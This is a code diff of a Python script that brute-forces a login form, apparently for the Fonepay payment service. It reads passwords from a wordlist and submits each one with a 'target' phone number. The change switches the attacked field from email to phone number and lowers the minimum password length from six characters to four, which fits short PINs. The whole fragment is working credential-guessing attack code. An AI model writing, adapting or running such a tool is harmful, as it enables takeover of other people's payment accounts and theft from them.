@@ -27,23 +27,23 @@ except:
 print('\n---------- Welcome To Fonepay ----------\n')
 file=open('passwords.txt','r')
 
-email=str(raw_input('Enter Email/Username : ').strip())
+number=str(raw_input('number : ').strip())
 
-print ("\nTarget Email ID : ",email)
+print ("\nTarget number : ",number)
 print "\nTrying Passwords from list ..."
 
 i=0
 while file:
 	passw=file.readline().strip()
 	i+=1
-	if len(passw) < 6:
+	if len(passw) < 4:
 		continue
 	print str(i) +" : ",passw
 	response = browser.open(post_url)
 	try:
 		if response.code == 200:
 			browser.select_form(nr=0)
-			browser.form['email'] = email
+			browser.form['number'] = number
 			browser.form['pass'] = passw
 			response = browser.submit()
 			response_data = response.read()
